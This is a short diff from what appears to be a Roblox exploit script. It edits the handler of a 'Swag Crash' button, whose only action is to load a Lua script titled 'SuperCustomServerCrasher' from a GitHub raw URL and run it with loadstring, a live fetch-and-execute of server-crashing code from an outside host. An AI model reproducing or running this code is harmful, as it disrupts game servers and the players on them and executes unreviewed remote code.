@@ -34,7 +34,7 @@ wait(15.7) end
         end
 end)
 Section1:NewButton("Swag Crash", "ButtonInfo", function()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()`
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
 
 end)
 
